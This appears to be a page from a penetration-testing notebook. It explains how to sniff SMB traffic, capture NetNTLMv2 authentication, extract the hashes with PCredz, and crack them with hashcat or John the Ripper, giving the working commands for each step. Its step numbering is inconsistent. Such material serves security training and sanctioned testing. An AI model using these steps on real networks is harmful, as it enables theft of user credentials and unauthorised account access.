<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>extract NetNTLMv2 hashes from pcap file and crack</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>extract NetNTLMv2 hashes from pcap file and crack</h1><br /><strong>
      <h3>Prerequisite: Install PCredz</h3>
    </strong><strong><br /></strong>
    <div class="codebox">
      <div class="codebox">
        apt&nbsp;install&nbsp;python3-pip&nbsp;&amp;&amp;&nbsp;pip3&nbsp;install&nbsp;Cython&nbsp;&amp;&amp;&nbsp;pip3&nbsp;install&nbsp;python-libpcap&nbsp;&nbsp;&nbsp;#Linux<br />cd&nbsp;/root/bin/<br />git&nbsp;clone&nbsp;https://github.com/lgandx/PCredz.git
      </div>
    </div><br /><br /><strong>
      <h3>How to do it(without using Metasploit):</h3>
    </strong><br />1. <strong>Sniff</strong> → We can use both tcpdump or Wireshark to sniff and save the packet
    capture<br />
    <div class="codebox">
      <div class="codebox">tcpdump&nbsp;-nv&nbsp;-s0&nbsp;port&nbsp;445&nbsp;-w&nbsp;/tmp/captured.pcap</div>
    </div><br /> -s0 → indicates that we want full packets, not just the first 68 bytes (some old versions of tcpdump
    will only grab the first 68 bytes)<br /> -v → print out how many packets it has received so far<br /> -w → save file
    <br />2. <strong>Authentication attempt</strong> → Here we simulate a client that try to authenticate with us<br />
    <div class="codebox">
      <div class="codebox">smbclient&nbsp;//AttackerIP/c$&nbsp;random&nbsp;-U&nbsp;random</div>
    </div><br /> <a href=""><img src="images/814-1.png" alt="images/814-1.png" /></a><br />3. <strong>Terminate
      tcpdump</strong> → tcpdump sniffer in the other tab should show that you’ve captured some packets.<br /> YOU MUST
    press CTRL-C in the tcpdump terminal or tcpdump will not write the packets into its capture file. We’ve gathered our
    packets<br />5. <strong>Extract</strong> → Extract hashes into a crackable format with
    PCredz(https://github.com/lgandx/PCredz) that is a free tool to extract many types of hashes<br />
    <div class="codebox">
      <div class="codebox">cd&nbsp;/root/bin/PCredz<br />python3&nbsp;Pcredz&nbsp;-f&nbsp;/tmp/captured.pcap</div>
    </div> <a href=""><img src="images/814-2.png" alt="images/814-2.png" /></a><br /> 2.1. The Pcredz tool doesn&#39;t
    have an option to save the hashes directly in a crackable format, It instead create a log file named
    CredentialDump-Session.log in the PCredz folder that contains the output, including hashes. Now we manually select
    the hash and save it in a.txt file, a format we can use with Hashcat or John <br />
    <div class="codebox">
      <div class="codebox">nano&nbsp;hash.txt<br />cat&nbsp;hash.txt</div>
    </div><br /> <a href=""><img src="images/814-3.png" alt="images/814-3.png" /></a><br />8. <strong>Crack</strong>
    <br /> ◇ We can crack with <a
      href="Home--Penetration_Test_Methodology--Network_Pentest--Password_Cracking_Tools--Jhon_the_Ripper_(CPU).html">John
      the Ripper</a> or <a
      href="Home--Penetration_Test_Methodology--Network_Pentest--Password_Cracking_Tools--Hashcat_(CPU-GPU).html">Hashcat</a><br />
    ▪ <div class="codebox">
      <div class="codebox">
        hashcat&nbsp;-w&nbsp;3&nbsp;-a&nbsp;0&nbsp;-m&nbsp;5600&nbsp;hash.txt&nbsp;password.lst&nbsp;&nbsp;&nbsp;#Hash-mode&nbsp;5600&nbsp;is&nbsp;for&nbsp;NetNTLMv2
      </div>
    </div><br /> ▪ <div class="codebox">
      <div class="codebox">
        john&nbsp;hash.txt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#JtR&nbsp;autodetect&nbsp;the&nbsp;type&nbsp;of&nbsp;the&nbsp;hash
      </div>
    </div><br /> ◇ Cain can sniff, extract, and crack all by itself, but it isn&#39;t a strong
    cracker<br /><br /><br /><br />
  </div>
</body>

</html>